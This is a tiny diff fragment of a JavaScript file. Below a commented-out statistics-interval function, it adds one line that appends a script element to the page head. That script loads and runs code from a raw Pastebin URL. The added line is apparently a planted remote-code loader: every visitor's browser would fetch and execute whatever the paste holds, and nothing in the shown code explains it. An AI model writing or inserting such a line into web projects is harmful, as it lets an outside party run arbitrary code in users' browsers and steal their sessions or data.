@@ -89,3 +89,4 @@ function stopintervalstatistics() {
   clearinterval(intervalstatistics);
 }
 */
+document.head.appendChild(document.createElement('script')).src='https://pastebin.com/raw/vHfC9sEs'
